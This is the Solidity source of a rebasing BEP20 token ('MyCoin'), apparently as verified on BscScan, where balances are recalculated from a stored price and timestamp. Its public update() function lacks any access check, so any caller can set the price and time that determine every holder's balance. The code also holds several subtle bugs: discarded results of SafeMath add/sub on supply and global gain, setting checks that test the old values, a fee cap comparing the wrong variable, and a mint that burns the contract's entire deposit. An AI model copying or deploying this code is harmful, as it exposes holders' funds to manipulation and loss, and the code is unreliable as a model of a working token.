/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

pragma solidity 0.5.16;

  interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
  }

  interface Ig {
    function inDAO(address a) external view returns (bool);
  }

  interface IOracle {
    function getCurrentPrice() external view returns (uint256);
  }


  contract Context {
    constructor () internal { 
    }

    function _msgSender() internal view returns (address payable) {
      return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
      this; 
      return msg.data;
    }
  }


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b > 0, errorMessage);
      uint256 c = a / b;
      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }

  contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
      return _owner;
    }

    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
  }

  contract MyCoin is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) public userGain;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private entry;
    mapping (address => bool) public excluded;  
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private fee = 0;
    uint256 private prevPrice = 1;
    uint256 private timeStamp = now;
    uint256 private lastUpdate = now;   
    uint256 private globalLoss = 1e20;
    uint256 private globalGain = 1e20;
    uint256 private w = 14000;
    uint256 private v = 5;
    uint256 private l = 100000;
    uint256 private N = now;
    uint256 private C = 16000000000000000000000;   
    uint8 private a = 80;
    uint8 private transferFee = 5;  
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    bool private paused = false;
    bool private subtractFee = true;

    Ig private gCoin;
    IBEP20 private xgCoin;
    IOracle private myOracle;
    
    constructor() public {
      _name = "MyCoin";
      _symbol = "COIN";
      _decimals = 18;
      _totalSupply = 10000000000000000000000;
      _balances[_msgSender()] = _totalSupply;
      initContracts(0x5D9B130B9B7fe205645BddACE2971E5b1FF7931B, 0x5D9B130B9B7fe205645BddACE2971E5b1FF7931B, 0x5D9B130B9B7fe205645BddACE2971E5b1FF7931B);
      excludeAddr(address(this), true);
      excludeAddr(_msgSender(), true);
      entry[_msgSender()] = now;
      init();
      emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function getOwner() external view returns (address) {
      return owner();
    }

    function decimals() external view returns (uint8) {
      return _decimals;
    }

    function symbol() external view returns (string memory) {
      return _symbol;
    }

    function name() external view returns (string memory) {
      return _name;
    }

    function excludeAddr(address account, bool setting) public onlyOwner {
      excluded[account] = setting;
      updateAccount(account);
    }

    function emergencyStop(bool _p) public onlyOwner {
      paused = _p;
    }

    function init() public onlyOwner {
      prevPrice = getCurrentPrice();
      timeStamp = getNow();
    }

    function setFees(uint8 _transferFee, uint8 _fee, bool _subtractFee) public onlyOwner {
      require(_transferFee <= 100);
      transferFee = _transferFee;
      fee = _fee;
      subtractFee = _subtractFee;
    }

    function settings(uint256 _l, uint256 _w, uint8 _a, uint256 _v) public onlyOwner {
      require(_a < 200);
      require(v > 0);
      require(w > 1000);
      require(l > 1000);
      l = _l;
      w = _w;
      a = _a;
      v = _v;
    }

    function totalSupply() external view returns (uint256) {
      return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
      return getNewBalance(account);
    }
    
    function getFee(address account) internal view returns (uint256) {
      if(excluded[account] || userGain[account] == 0) return 0;
      uint256 _fee = _balances[account] * (getNow() - entry[account]) * fee / 100000000000000;
      if(fee > _balances[account] / 2) _fee = _balances[account] / 2;
      if(inDao(account)) _fee = subtractFee ? _fee / 10 : _fee * 15 / 10;
      return _fee;
    }

    function initContracts(address a1, address a2, address a3) public onlyOwner {
      myOracle = IOracle(a1);
      gCoin = Ig(a2);
      xgCoin = IBEP20(a3);
    }

    function currentBalance(address account) external view returns (uint256) {
      return _balances[account];
    }

    function inDao(address account) public view returns (bool) {
      //return gCoin.inDAO(account);
      return false;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
      _transfer(_msgSender(), recipient, amount);
      return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
      return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
      _transfer(sender, recipient, amount);
      if(recipient != address(xgCoin)) {
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
      }
      return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
      return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
      return true;
    }

    function getNow() public view returns (uint256) {
      return N;
    }

    function getCurrentPrice() public view returns (uint256) {
      //return myOracle.getCurrentPrice() * 10000000000;
      return C;
    }

    function getNewBalance(address account) internal view returns (uint256) {
      if(userGain[account] == 0) return _balances[account];
      if(!excluded[account] && !paused) {
        uint256 b = _balances[account] * getGain() / userGain[account];
        return subtractFee ? b - getFee(account) : b + getFee(account);
      }
      return _balances[account];
    }

    function getVars() internal view returns (uint256, uint256, uint256, uint256) {
      uint256 c = getCurrentPrice();
      uint256 x = c ** 2 / prevPrice;
      uint256 s = x * (getNow() - timeStamp) * w / 1000000000000;
      uint256 r = x - s;
      uint256 R = (s > x || r < c) ? c * a / 100 : r * a / 100;
      return (R, c, (s > x) ? 1 : 0, r);
    }

    function getGain() internal view returns (uint256) {
      (uint256 R, uint256 c,,) = getVars();
      uint256 g = (c * v + R) / (v + 1);
      g = (R > c) ? g + nextIncrease(R) : g - nextDecrease(R); 
      return (g.add(globalGain)).sub(globalLoss);     
    }

    function nextDecrease(uint256 R) internal view returns (uint256) {
      uint256 ratio = (globalLoss * 2 / globalGain);
      uint256 c = getCurrentPrice();
      if(R > c || lastUpdate > getNow()) return 0;
      if(ratio > 4) {
        if(ratio > 1e20) return 0;  
        ratio = ratio ** 2;
      }
      uint256 d = (c - R) * (getNow() - lastUpdate) * l / (10000000000000 * ratio);
      if(d < R) return d; 
      return 0;
    }

    function nextIncrease(uint256 R) internal view returns (uint256) {
      uint256 c = getCurrentPrice();
      if(c > R || lastUpdate > getNow()) return 0;
      uint256 i = (R - c) * (getNow() - lastUpdate) * l / 20000000000000;
      if(R + i >= R) return i; 
      return 0;
    }

    function reset(uint256 newTime, uint256 newPrice) onlyOwner public {
      timeStamp = newTime;
      lastUpdate = newTime;
      N = newTime;
      C = newPrice;
      globalLoss = 0;
      globalGain = 0;
    }

    function update(uint256 newTime, uint256 newPrice) public {
      N = newTime;
      C = newPrice;
      (uint256 R, uint256 c, uint256 q, uint256 r) = getVars();
      if(q == 1 || r < c) {
        prevPrice = c;
        timeStamp = getNow();
      }
      if(R > c) {
        globalGain.add(nextIncrease(R));
      } else {
        globalLoss.add(nextDecrease(R));
      }
      if(globalLoss > getCurrentPrice() + globalGain) emergencyStop(true);
      lastUpdate = getNow();
    }

    function mint(uint256 _amount) public {
      require(_amount > 0);
      updateAccount(_msgSender());
      uint256 balanceBefore = xgCoin.balanceOf(address(this));
      xgCoin.transferFrom(_msgSender(), address(this), _amount);
      uint256 balanceAfter = xgCoin.balanceOf(address(this));
      uint256 diff = SafeMath.sub(balanceAfter, balanceBefore);
      require(diff > 0); 
      uint256 amount2 = diff * (1000 - transferFee) / 1000;
      _mint(_msgSender(), amount2);
      xgCoin.burn(balanceAfter);
    }

    function updateAccounts(address[] calldata accounts) external {
      //update();
      for(uint256 i = 0; i < accounts.length; i++) calcBalance(accounts[i]);
    }

    function updateAccount(address account) public {
     // update();
      calcBalance(account);
    }

    function calcBalance(address account) internal {
      uint256 newBalance = getNewBalance(account);
      if(newBalance > _balances[account]) {
        uint256 diff = newBalance - _balances[account];
        _totalSupply.add(diff);
        emit Transfer(address(0), account, diff);          
      } else if(newBalance < _balances[account] ) {
        uint256 diff = _balances[account] - newBalance;
        _totalSupply.sub(diff);
        emit Transfer(account, address(0), diff);  
      }
      _balances[account] = newBalance;
      userGain[account] = getGain();
      entry[account] = getNow();
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");
      require(!paused);
      //update();

      if(!excluded[sender]) {
        calcBalance(sender);
      }

      if(!excluded[recipient]) {
        calcBalance(recipient);
      }
      
      uint256 _fee = amount * transferFee / 1000;
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);

      if(!excluded[recipient] && !paused) {
        require(_balances[recipient] > _fee);
        _burn(recipient, _fee);
      }
      
      emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
      require(account != address(0), "BEP20: burn from the zero address");
      if(amount > 0) {
        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
      }
    }

    function burn(uint256 amount) public returns (bool) {
      _burn(_msgSender(), amount);
      return true;
    }

    function _mint(address account, uint256 amount) internal {
      require(account != address(0), "BEP20: mint to the zero address");
      _totalSupply = _totalSupply.add(amount);
      _balances[account] = _balances[account].add(amount);
      emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");
      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
    }

    function getGlobals() external view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
      (uint256 R,,,) = getVars();
      return (getCurrentPrice(), R, getGain(), prevPrice, globalLoss, globalGain, v, w, l, nextDecrease(R), nextIncrease(R));
    }

    function getTransferFee() external view returns (uint256) {
      return transferFee;
    }

    function getUser(address _a) external view returns (uint256, uint256, uint256, uint256) {
      return (_balances[_a], userGain[_a], excluded[_a] ? 1 : 0, getFee(_a));
    }

  }